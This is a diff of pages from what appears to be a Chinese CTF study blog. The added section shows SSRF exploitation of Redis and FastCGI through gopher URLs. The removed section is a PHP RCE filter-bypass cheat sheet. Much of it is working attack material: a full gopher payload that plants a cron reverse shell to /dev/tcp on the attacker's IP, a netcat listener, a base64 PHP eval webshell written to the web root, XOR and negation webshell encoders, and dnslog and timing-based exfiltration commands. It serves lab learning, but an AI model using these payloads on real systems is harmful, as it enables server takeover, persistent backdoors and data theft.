+<h3 id="redis未授权ssh公钥写入"><a href="#redis未授权ssh公钥写入" class="headerlink" title="redis未授权ssh公钥写入"></a>redis未授权ssh公钥写入</h3><p>1.生成公钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ssrf/pasted-image-20260316191329.png" alt="Pasted image 20260316191329"><br>2.构造，将密钥写入payload（记得前后各加两行换行以排除其他因素的干扰，同时长度记得加4）同时修改文件名和路径（要拥有root权限，不然写入不了）<br>最后记得修改长度<br><img src="/images/ssrf/pasted-image-20260316190803.png" alt="Pasted image 20260316190803"><br>3.通过ssrf提交后重新登陆靶机发现不在需要密码了<br><img src="/images/ssrf/pasted-image-20260316191858.png" alt="Pasted image 20260316191858"></p>
+<h3 id="定时任务反弹shell"><a href="#定时任务反弹shell" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip add #查看kali ip地址，我的是172.28.121.48</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ssrf/pasted-image-20260316193056.png" alt="Pasted image 20260316193056"><br>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>
+<p>启动攻击<br>2.选择Reverseshell<br><img src="/images/ssrf/pasted-image-20260316193427.png" alt="Pasted image 20260316193427"><br>3.填写ip<br><img src="/images/ssrf/pasted-image-20260316194412.png" alt="Pasted image 20260316194412"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2468%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/172.28.121.48/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>
+<p>接着监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在靶场修改主机名发送即可<br><img src="/images/ssrf/pasted-image-20260316194940.png" alt="Pasted image 20260316194940"></p>
+<h2 id="FastCGL协议"><a href="#FastCGL协议" class="headerlink" title="FastCGL协议"></a>FastCGL协议</h2><p>1.在虚拟机kali中打开终端</p>
+<ul>
+<li>命令行下载：git clone <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></li>
+<li>cd ~&#x2F;桌面&#x2F;Gopherus</li>
+<li>启动攻击模块：python2 gopherus.py –exploit fastcgi </li>
+<li>第一行输入路径：启动 Gopherus 的 FastCGI 攻击模块后，工具会提示输入目标服务器上存在的 PHP 文件路径，输入之前获取的 PHP 文件路径，我们这里选中网站根目录下的index.php文件，路径如下为&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php，这里通常选择网址中存在的文件</li>
+<li>第二行输入要执行的命令：接下来工具提示输入要执行的命令，这是可以选择ls &#x2F;或cat &#x2F;flag等，工具会根据输入生成相应的 Gopher 协议有效载荷。我们这里选择使用在根目录上传木马文件ljn.php，如下 echo PD9waHAgQGV2YWwoJF9QT1NUWydtb295dWFuJ10pOz8+ | base64 -d &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;ljn.php ————把编码后的一句话木马写到名为ljn.php的文件中</li>
+<li>得到gopher:%2F%2F127.0.0.1:9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH137%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2589%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgQGV2YWwoJF9QT1NUWydtb295dWFuJ10pOz8%252B%2520%257C%2520base64%2520-d%2520%253E%2520%2Fvar%2Fwww%2Fhtml%2Fljn.php%2527%2529%253Bdie%2528%2527—–Made-by-SpyD3r—–%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500<br>2.在浏览器中将其附加在url后面<br>3.列出目录<br><img src="/images/ssrf/pasted-image-20251212093511.png" alt="Pasted image 20251212093511"><br>4.获取flag<br><img src="/images/ssrf/pasted-image-20251212093613.png" alt="Pasted image 20251212093613"></li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web??</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-php反序列化" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -647,449 +1090,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web??</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-RCE" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2026/07/02/RCE/" class="article-date">
-      <time datetime="2026-07-02T14:00:00.000Z" itemprop="datePublished">2026-07-02</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2026/07/02/RCE/">RCE</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <blockquote>
-<p>??????????????? CTF ??????????????<br>?????? PHP shell ???????????<code>&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br>?????? PHP payload ?????????<code>&lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br><code>shell.php</code> ??????? <code>output.txt</code>????????????????????</p>
-</blockquote>
-<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="命令执行（执行系统命令）"><a href="#命令执行（执行系统命令）" class="headerlink" title="命令执行（执行系统命令）"></a>命令执行（执行系统命令）</h2><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>作用</th>
-<th>是否直接把命令输出打印到页面？</th>
-<th>返回值是什么？</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>system()</code></td>
-<td>执行系统命令</td>
-<td>✅ 会把命令执行过程的输出打印出来</td>
-<td>返回命令输出的<strong>最后一行</strong>（字符串）</td>
-</tr>
-<tr>
-<td><code>passthru()</code></td>
-<td>执行命令并“原样”输出（适合二进制流）</td>
-<td>✅ 直接输出所有原始内容</td>
-<td>一般返回 <code>null</code></td>
-</tr>
-<tr>
-<td><code>exec()</code></td>
-<td>执行命令</td>
-<td>❌ 默认不输出</td>
-<td>返回最后一行文本，可选把每一行放到数组</td>
-</tr>
-<tr>
-<td><code>shell_exec()</code></td>
-<td>通过 shell 执行命令</td>
-<td>❌ 不直接输出</td>
-<td>返回<strong>完整输出字符串</strong></td>
-</tr>
-<tr>
-<td>反引号 <code>...</code></td>
-<td>和 <code>shell_exec()</code> 类似</td>
-<td>❌ 不直接输出</td>
-<td>返回命令输出（字符串）</td>
-</tr>
-<tr>
-<td><code>popen()</code></td>
-<td>打开一个进程的管道（读 &#x2F; 写）</td>
-<td>❌ 本身不输出</td>
-<td>返回资源句柄，自己读写</td>
-</tr>
-<tr>
-<td><code>proc_open()</code></td>
-<td>更高级的进程控制，多路管道</td>
-<td>❌ 本身不输出</td>
-<td>返回进程资源，还可拿到各个管道句柄</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>总结：<strong>直接把结果“打印出来”的</strong>主要是 <code>system()</code> 和 <code>passthru()</code>，其它大部分都是“<strong>返回字符串&#x2F;资源</strong>”，需要自己 <code>echo</code> &#x2F; <code>var_dump</code> 才看得到。</p>
-</blockquote>
-<ul>
-<li><p><strong>直接回显的（命令执行时就打印到页面）</strong>：</p>
-<ul>
-<li><code>system()</code>、<code>passthru()</code></li>
-</ul>
-</li>
-<li><p><strong>只返回结果，不主动回显的</strong>：</p>
-<ul>
-<li><code>exec()</code>、<code>shell_exec()</code>、反引号、<code>popen()</code>、<code>proc_open()</code>（这些要你自己把结果 echo 出来）</li>
-<li><pre><code>string exec(string $command, array &amp;$output = null, int &amp;$return_var = null)
-$command string要执行的系统命令
-&amp;$output array（引用）|接收命令标准输出的每一行不含换行符）,每次调用会追加内容！使用               前需 `unset($output)` 或 `$output = []`|
-&amp;$return_var int（引用）|接收命令退出状态码（0=成功）|
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">      </span><br></pre></td></tr></table></figure>
-   popen(string $command, string $mode)
-   command参数:要执行的命令。
-   mode参数:模式。&#39;r&#39;表示阅读，&#39;w&#39;表示写入fgets获取内容→print_r输出内容
-</code></pre>
-</li>
-</ul>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 绕过</span><br><span class="line">### 过滤字符</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>（1）使用通配符绕过</p>
-<p>形如：f???​或者f*​匹配flag文件</p>
-<p>（2）使用单引号绕过fla’’g​</p>
-<p>（3）使用\​绕过fla\g​</p>
-<p>（4）使用{}​绕过，如fl{a}g​</p>
-<p>（5）使用正则匹配绕过，如fl[a-a]g​</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 过滤函数</span><br></pre></td></tr></table></figure>
-<p>cat<br>tac<br>more<br>head<br>tail<br>nl<br>strings<br>sort<br>less<br>awk<br>sed<br>grep<br>base64<br>rev<br>od<br>vi<br>vim<br>pr<br>uniq</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤了/​</span><br><span class="line"></span><br><span class="line">绕过方法：</span><br><span class="line">1.利用cd指令切目录</span><br></pre></td></tr></table></figure>
-<p>payload：cd ..&amp;&amp;ls​，cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;ls​</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.通过dirname在当前目录一个个消除路径，直到最终到达根目录</span><br></pre></td></tr></table></figure>
-<p>payload&#x3D;ls${IFS}-a${IFS}$(dirname${IFS}$(dirname${IFS}$(dirname${IFS}$PWD)))</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤空格</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>使用&lt;​ 、&lt;&gt;​、%20​(space)、%09​(tab)、$IFS$9​、 ${IFS}​、$IFS​等代替空格</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 变量拼接绕过正则</span><br></pre></td></tr></table></figure>
-<p>以flag为例:</p>
-<p>x&#x3D;ag;cat fl$x</p>
-<p>相当于:</p>
-<p>cat flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Linux 变量操作符$&#123;&#125;</span><br></pre></td></tr></table></figure>
-<p>${PATH:start:length}<br>start：起始位置<br>length：截取长度，可为负数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**替换字符**</span><br><span class="line">单替换</span><br></pre></td></tr></table></figure>
-<p> ${file&#x2F;a&#x2F;b}<br>将字符串中第一个a替换为b<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**全替换**</span><br></pre></td></tr></table></figure><br> ${file&#x2F;&#x2F;a&#x2F;b}<br>将字符串所有的a替换为b<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br></pre></td></tr></table></figure><br> ${PATH:14:1}${PATH:5:1} flag.txt</p>
-<p>在此环境中相当于 nl flag.txt<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### Ascll拼接变形</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY></p>
-<p>$func &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</p>
-<p>$cmd &#x3D; ‘’;</p>
-<p>$cmd_chars &#x3D; [108,115];</p>
-<p>foreach($cmd_chars as $ascii) {</p>
-<p>    $cmd .&#x3D; chr($ascii);</p>
-<p>}</p>
-<p>@$func($cmd);</p>
-<p>?&gt;<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">转ascll脚本</span><br></pre></td></tr></table></figure><br><PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY></p>
-<p>$filename &#x3D; “cat 6a2139364f96787c8ce1bbb0070b898c.php”;</p>
-<p>$ascii_array &#x3D; [];</p>
-<p>for ($i &#x3D; 0; $i &lt; strlen($filename); $i++) {</p>
-<p>    $ascii_array[] &#x3D; ord($filename[$i]);</p>
-<p>}</p>
-<p>echo implode(“,”, $ascii_array);</p>
-<p>?&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 按位取反（~） + 十六进制转义（\x）试一下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY>
-
-<p>$func &#x3D; create_function(‘’, ~”\x8f\x97\x8f\x96\x91\x99\x93”[‘cmd’]);</p>
-<p>$func();</p>
-<p>?&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## 无回显</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### if</span><br></pre></td></tr></table></figure>
-<p>import requests<br>import time<br>url &#x3D; “<a target="_blank" rel="noopener" href="http://192.168.1.6:19080/class08/1.php">http://192.168.1.6:19080/class08/1.php</a>“<br>result &#x3D; “”<br>for i in range(1,5):<br>    for j in range(1,55):<br>    #ascii镶嵌<br>    for k in range(32,128):<br>    k&#x3D;chr(k)<br>    #time.sleep(0.1)<br>    payload &#x3D; “?cmd&#x3D;” + f”if [ &#96;cat flag.php | awk NR&#x3D;&#x3D;{i} | cut -c {j} &#x3D;&#x3D; {k} ] ;then sleep 2;fi”<br>    try:<br>    requests.get(url&#x3D;url+payload, timeout&#x3D;(1.5,1.5))<br>    except:<br>    result &#x3D; result + k<br>    print(result)<br>    break<br>result +&#x3D; “”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">### tee</span><br><span class="line">### [SWPUCTF 2021 新生赛]finalrce (NSSCTF)</span><br><span class="line">![Pasted image 20251130141151](/images/rce/pasted-image-20251130141151.png)</span><br><span class="line"></span><br><span class="line"> 因为没有回显，所以需要把查看出来的内容读取并且写入一个地方来查看，tee命令就是从标准输入读取，再写入标准输出和文件。简单说就是把查看的内容读取然后写入到后面的txt文件</span><br><span class="line"> &gt;&quot;\\&quot;-转义符我理解的作用就是在一些控制字符被过滤的时候，可以用转义符，让控制符失去原本的含义，变为字面量，但是作用不变。</span><br><span class="line"> </span><br><span class="line">/?url=l\s / |tee 1.txt,然后访问1.txt看到flag文件</span><br><span class="line">/?url=tac /flllll\aaaaaaggggggg |tee 2.txt，访问2.txt就看到flag了</span><br><span class="line"></span><br><span class="line">### dnslog外带数据法</span><br><span class="line">```  </span><br><span class="line">    curl dnslog平台url/`cat flag.php|base64`</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h2><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p> [SWPUCTF 2021 新生赛]hardrce (NSSCTF)<br><img src="/images/rce/pasted-image-20251130134820.png" alt="Pasted image 20251130134820"><br>不能使用字母和黑名单的特殊字符，但是有eval，满足条件即可执行<br>绕过方法：对需要使用的函数进行取反，然后再进行URL 编码</p>
-<ul>
-<li>注意：在使用取反编码再取反进行绕过时，想要执行我们指定的代码，传入的payload必须要满足 <strong>(函数名)()</strong> 这样的形式，否则在取反之前PHP解释器并不知道是要执行一个函数，取反之后就算是一个函数也不会被当作代码执行<br>执行system(‘ls &#x2F;‘)，取反?wllm&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C%DF%D0);找到flllllaaaaaaggggggg的文件<br>执行system(“cat &#x2F;flllllaaaaaaggggggg”);取反后?wllm&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);即可得到flag<br>脚本</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"></span><br><span class="line">$a=&quot;system&quot;;</span><br><span class="line"></span><br><span class="line">$b = &quot;tac /f*&quot;;</span><br><span class="line"></span><br><span class="line">echo urlencode(~$a);</span><br><span class="line"></span><br><span class="line">print(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">echo urlencode(~$b);</span><br><span class="line"></span><br><span class="line">print(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">print(&quot;(~&quot;.urlencode(~$a).&quot;)(~&quot;.urlencode(~$b).&quot;);&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/rce/pasted-image-20260215191010.png" alt="Pasted image 20260215191010"></p>
-<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">echo &#x27;A&#x27;^&#x27;?&#x27;;</span><br></pre></td></tr></table></figure>
-<p>首先将 <code>A</code> 和 <code>?</code> 分别转换为对应的ASCII码，A变为65，?变为63 然后将其转换为对应的二进制数，A变为<code>1000001</code>，?变为<code>111111</code> 接下来就进行运算，异或的运算规则是相同为0，不同为1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A:		1000001</span><br><span class="line">1:		0111111(少一位，前面补0即可) </span><br><span class="line">结果：	1111110</span><br></pre></td></tr></table></figure>
-<p>接下来将其二进制转换为对应十进制数，<code>1111110</code>对应的十进制数为<code>126</code>，根据ASCII码表可知126对应的是<code>~</code><br>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$__=(&quot;#&quot;^&quot;|&quot;); // _</span><br><span class="line">$__.=(&quot;.&quot;^&quot;~&quot;); // _P</span><br><span class="line">$__.=(&quot;/&quot;^&quot;`&quot;); // _PO</span><br><span class="line">$__.=(&quot;|&quot;^&quot;/&quot;); // _POS</span><br><span class="line">$__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST </span><br><span class="line">$$__[_]($$__[__]); // $_POST[_]($_POST[__]);</span><br></pre></td></tr></table></figure>
-<p>然后进行一次URL编码，因为中间件会解码一次</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后让&amp;_=system和&amp;__=ls即可</span><br></pre></td></tr></table></figure>
-
-<p>或者脚本直接出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">from sys import *</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line"></span><br><span class="line">ans1=&quot;&quot;</span><br><span class="line"></span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,256): #设置i的范围</span><br><span class="line"></span><br><span class="line">    c=chr(i)</span><br><span class="line"></span><br><span class="line">    #将i转换成ascii对应的字符，并赋值给c</span><br><span class="line"></span><br><span class="line">    tmp = re.match(r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;,c,re.I)</span><br><span class="line"></span><br><span class="line">    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span><br><span class="line"></span><br><span class="line">    if(tmp):</span><br><span class="line"></span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        a.append(i)</span><br><span class="line"></span><br><span class="line">        #在数组中增加i，这些就是未被系统过滤掉的字符</span><br><span class="line"></span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"></span><br><span class="line">mya=&quot;system&quot;  #函数名 这里修改！</span><br><span class="line"></span><br><span class="line">myb=&quot;dir&quot;      #参数</span><br><span class="line"></span><br><span class="line">def myfun(k,my): #自定义函数</span><br><span class="line"></span><br><span class="line">    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错</span><br><span class="line"></span><br><span class="line">    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错</span><br><span class="line"></span><br><span class="line">    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量</span><br><span class="line"></span><br><span class="line">        for j in range(i,len(a)): #在上个循环的条件下设置j的范围</span><br><span class="line"></span><br><span class="line">            if(a[i]^a[j]==ord(my[k])):</span><br><span class="line"></span><br><span class="line">                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])</span><br><span class="line"></span><br><span class="line">                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])</span><br><span class="line"></span><br><span class="line">                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span><br><span class="line"></span><br><span class="line">for x in range(0,len(mya)): #设置k的范围</span><br><span class="line"></span><br><span class="line">    myfun(x,mya)#引用自定义的函数</span><br><span class="line"></span><br><span class="line">data1=&quot;(&#x27;&quot;+urllib.request.quote(ans1)+&quot;&#x27;^&#x27;&quot;+urllib.request.quote(ans2)+&quot;&#x27;)&quot; #data1等于传入的命令,&quot;+ans1+&quot;是固定格式，这样可以得到变量对应的值，再用&#x27;包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值</span><br><span class="line"></span><br><span class="line">print(data1)</span><br><span class="line"></span><br><span class="line">ans1=&quot;&quot;#对ans1进行重新赋值</span><br><span class="line"></span><br><span class="line">ans2=&quot;&quot;#对ans2进行重新赋值</span><br><span class="line"></span><br><span class="line">for k in range(0,len(myb)):#设置k的范围为(0,len(myb))</span><br><span class="line"></span><br><span class="line">    myfun(k,myb)#再次引用自定义函数</span><br><span class="line"></span><br><span class="line">data2=&quot;(\&quot;&quot;+urllib.request.quote(ans1)+&quot;\&quot;^\&quot;&quot;+urllib.request.quote(ans2)+&quot;\&quot;)&quot;</span><br><span class="line"></span><br><span class="line">print(data2)</span><br></pre></td></tr></table></figure>
-<p><img src="/images/rce/pasted-image-20260215190842.png" alt="Pasted image 20260215190842"></p>
-<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>直接拼接个空</p>
